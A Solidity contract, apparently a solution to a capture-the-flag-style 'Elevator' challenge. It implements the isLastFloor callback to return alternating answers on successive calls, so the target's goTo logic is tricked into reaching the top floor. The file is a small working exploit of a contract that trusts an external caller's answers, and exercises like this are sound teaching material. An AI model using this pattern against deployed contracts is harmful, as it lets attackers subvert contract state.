// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface InterfaceElevator {
  function goTo(uint _floor) external;
}

contract AttackElevator{
  InterfaceElevator elevator;
  bool public isTop = true;

  constructor(address _elevatorAddress){
    elevator = InterfaceElevator(_elevatorAddress);
  }

  function isLastFloor(uint) external returns (bool){
    isTop = !isTop;

    return isTop;
  }

  function attack() public{
    elevator.goTo(10);
  }
}